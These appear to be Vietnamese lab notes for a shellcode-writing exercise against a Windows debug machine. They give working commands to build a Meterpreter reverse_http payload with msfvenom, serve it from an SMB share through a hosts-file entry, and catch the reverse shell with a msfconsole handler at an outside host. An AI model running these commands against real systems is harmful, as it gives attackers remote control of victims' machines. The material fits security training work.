# Bài 2:
Lưu ý chụp lại các đoạn có IP của máy Debug sau khi đã khai thác thành công để làm minh chứng.  
[Các template các hàm](https://github.com/Cl0wnK1n9/ShellcodeTemplate-windowx86/tree/main/Functions)  

Để load DLL thì đổi sang ASCII sang hex (Lưu ý trong code viết bytes theo chiều ngược lại) \
Để load API thì tính hash: \
[Code tính hash tên các API](https://github.com/10u15hack1ng/x86Win-Notes/blob/main/Custom%20Shellcode/getAPIhash.py)

Để sinh payload bằng metasploit trên máy tấn công:
```
$ msfvenom -p windows/meterpreter/reverse_http HOST=192.168.45.178 LPORT=4343 -f exe -o met.exe
```

Thay đổi file hosts trên máy Windows để tạo kết nối UNC sang máy tấn công.  
Dùng notepad để thêm 1 dòng trong file hosts.
```
# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
  <Địa chỉ IP>    kali
```

Để tạo SMB server trên máy tấn công ([Nếu không có lệnh smbserver.py]())
```
sudo smbserver.py met /home/kali/ -smb2support
```

Khi đã chạy smb server thành công thì có thể kiểm tra bằng lệnh sau trên máy Windows:
```
pushd <Đường dẫn UNC>
# VD: pushd \\ubuntu\folder
# Khi đó trong terminal sẽ hiện lên folder của bên máy đang chạy SMB 

# Thoát đường dẫn
popd <Đường dẫn UNC>
```

Để tạo listener trên máy tấn công khi thực thi shellcode:
```
# Exploit after met.exe execution
$ msfconsole
msf> use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_http
msf exploit(handler) > set LHOST consulting.example.org
msf exploit(handler) > set LPORT 4443
msf exploit(handler) > set SessionCommunicationTimeout 0
msf exploit(handler) > set ExitOnSession false
msf exploit(handler) > exploit -j
```

Tham khảo cách viết: [Shellcode trong sách](https://github.com/10u15hack1ng/x86Win-Notes/blob/main/Custom%20Shellcode/shellcode_NO_CHANGE_PLEASE.py)  

Trong quá trình debug, có thể dùng lệnh `dds <địa chỉ>` để kiểm tra các hàm đã được lưu đúng chưa.  
Nếu các hàm đã được lưu đúng thì sẽ hiện tên hàm ở trong output.
